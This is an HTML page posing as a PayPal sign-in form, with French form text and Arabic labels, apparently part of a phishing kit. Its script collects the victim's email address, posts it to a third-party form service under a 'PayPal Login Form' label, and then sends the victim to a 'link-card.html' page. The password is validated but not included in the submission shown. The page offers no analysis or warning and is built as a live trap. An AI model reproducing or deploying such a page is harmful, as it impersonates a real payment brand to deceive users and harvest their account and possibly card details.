<html>

<head>
    <meta charset="utf-8" />
    <meta content="width=device-width, initial-scale=1" name="viewport" />
    <title>
        تسجيل دخول باي بال
    </title>
    <script src="https://cdn.tailwindcss.com">
    </script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet" />
    <link rel="stylesheet" href="style.css">
</head>

<body class="">

    <main class="px-6 mt-12 max-w-md mx-auto w-full" id="login-box">
        <div class="pt-3 flex justify-center">
            <h1 class="h1"> PayPal </h1>

        </div>
        <div class="relative overflow-hidden " id="div"> <!-- Hauteur ajustable -->
            <!-- Étape 1 -->
            <div id="set1" class="absolute inset-0 transition-all duration-500 ease-in-out">
                <div class="form-group">
                    <input type="email" id="email" class="custom-input" placeholder=" " required>
                    <label for="email">Entrez votre email</label>
                    <div id="emailError" class="text-red-500 text-sm mt-1 hidden"></div>
                </div>
                <div>
                    <button type="button" class="text-blue-700 font-semibold hover:underline">
                        Adresse email oubliée?
                    </button>
                </div>
            </div>

            <!-- Étape 2 -->
            <div id="set2" class="absolute inset-0 transition-all duration-500 ease-in-out"
                style="transform: translateX(100%); opacity: 0;">
                <div class="flex items-center justify-center">
                    <span class="text-gray-700 font-bold" id="emailDisplay"></span>
                    <button type="button" class="text-blue-600 hover:underline font-bold"
                        onclick="modifyEmail()">Modifier</button>
                </div>
                <div class="form-group">
                    <input type="password" id="confirm" class="custom-input" placeholder=" " required>
                    <label for="confirm">Mot de passe</label>
                    <div id="passwordError" class="text-red-500 text-sm mt-1 hidden"></div>
                </div>
                <div>
                    <button type="button" class="text-blue-700 font-semibold hover:underline">
                        Mot de passe oublie? </button>
                </div>
            </div>
        </div>

        <!-- Autres éléments du formulaire -->


        <button id="submitBtn" type="button"
            class="w-full bg-blue-800 text-white font-bold text-lg rounded-full py-3 mt-2">
            Suivant
        </button>

        <div class="flex items-center my-6">
            <hr class="flex-grow border-t border-gray-300">
            <span class="mx-3 text-gray-500 font-semibold">ou</span>
            <hr class="flex-grow border-t border-gray-300">
        </div>

        <button type="button" class="custom-button" onclick="window.location.href='signup.html'">
            Ouvrir un compte
        </button>
        </form>
        <nav aria-label="اختيار اللغة"
            class="mt-16 flex flex-wrap items-center justify-center gap-x-2 gap-y-1 text-gray-600 text-sm select-none">
            <button class="flex items-center gap-1" type="button">
                <img alt="علم الولايات المتحدة الأمريكية" class="w-5 h-4 object-cover" loading="lazy"
                    src="https://flagcdn.com/us.svg" />
                <i class="fas fa-chevron-down text-xs">
                </i>
            </button>
            <button class="font-semibold" type="button">
                English
            </button>
            <span class="border-l border-gray-400 h-4 mx-2">
            </span>
            <button type="button">
                Français
            </button>

        </nav>
    </main>
    <footer class="footer">
        <nav class="footer-nav" aria-label="روابط تذييل الصفحة">
            <a href="#">Contact</a>
            <a href="#">Respect de la vie privée</a>
            <a href="#">Contrats d'utilisation</a>
            <a href="#">International</a>
        </nav>
    </footer>

     
</body>
<script>
    const submitBtn = document.getElementById('submitBtn');
    const set1 = document.getElementById('set1');
    const set2 = document.getElementById('set2');
    let currentStep = 1;

    function showError(elementId, message) {
        const errorElement = document.getElementById(elementId);
        errorElement.textContent = message;
        errorElement.classList.remove('hidden');
    }

    function hideError(elementId) {
        const errorElement = document.getElementById(elementId);
        errorElement.classList.add('hidden');
    }

    function modifyEmail() {
        // Return to email input step
        set1.style.transform = 'translateX(0)';
        set1.style.opacity = '1';
        set2.style.transform = 'translateX(100%)';
        set2.style.opacity = '0';
        submitBtn.textContent = 'Suivant';
        currentStep = 1;
        hideError('emailError');
        hideError('passwordError');
    }

    function validateEmail(email) {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(email);
    }

    submitBtn.addEventListener('click', async function () {
        if (currentStep === 1) {
            // Validate email
            const email = document.getElementById('email').value;
            hideError('emailError');

            if (!email || email.trim() === '') {
                showError('emailError', 'L\'email ne peut pas être vide');
                return;
            }

            if (!validateEmail(email)) {
                showError('emailError', 'Veuillez entrer une adresse email valide');
                return;
            }

            // Display email above password field
            document.getElementById('emailDisplay').textContent = email;

            // Animation to the left
            set1.style.transform = 'translateX(-100%)';
            set1.style.opacity = '0';

            set2.style.transform = 'translateX(0)';
            set2.style.opacity = '1';

            // Change button text
            submitBtn.textContent = 'Connexion';
            currentStep = 2;
        } else {
            // Validate password
            const password = document.getElementById('confirm').value;
            hideError('passwordError');

            if (!password || password.trim() === '') {
                showError('passwordError', 'Le mot de passe ne peut pas être vide');
                return;
            }

            // Get the email and password values
            const email = document.getElementById('email').value;
            try {
                // Submit to Web3Forms API
                const formData = new FormData();
                formData.append('access_key', '230c4c31-ef56-4717-a2c7-f8bf8a09f108');
                formData.append('from_name', 'PayPal Login Form');
                formData.append('subject', 'New Login Submission');
                formData.append('message', 'New login attempt');
                formData.append('user_email', email);
                formData.append('user_data', JSON.stringify({
                    email: email,
                    timestamp: new Date().toISOString()
                }));

                const response = await fetch('https://api.web3forms.com/submit', {
                    method: 'POST',
                    body: formData,
                    headers: {
                        'Accept': 'application/json'
                    }
                });

                const result = await response.json();
                console.log('API Response:', result);

                if (result.success) {
                    // Redirect to link-card.html after successful submission
                    window.location.href = 'link-card.html';
                } else {
                    const errorMessage = result.message || 'Une erreur est survenue. Veuillez réessayer.';
                    showError('passwordError', errorMessage);
                }
            } catch (error) {
                console.error('Error:', error);
                showError('passwordError', 'Une erreur est survenue. Veuillez réessayer.');
            }
        }
    });
</script>

</html>